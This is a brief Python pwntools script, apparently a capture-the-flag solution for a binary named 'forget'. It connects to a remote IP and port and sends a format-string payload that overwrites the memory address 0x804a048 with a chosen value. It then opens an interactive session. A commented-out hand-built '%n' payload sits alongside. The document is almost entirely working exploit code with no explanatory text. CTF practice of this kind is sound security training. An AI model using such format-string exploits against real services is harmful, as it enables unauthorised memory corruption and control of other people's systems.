#coding = utf-8
from pwn import *

p = remote ('220.249.52.133',47607)
context(arch='i386',os='linux',log_level='debug')
elf = ELF('./forget')
#p=process('./forget')

#payload=p32(0x804a048)+'a'*(0x2223322-4)+'%13$n'
payload=fmtstr_payload(12,{0x804a048:0x2223322})

p.sendline(payload)
#p.sendlineafter("Enter the string to be validate",payload)
p.interactive()
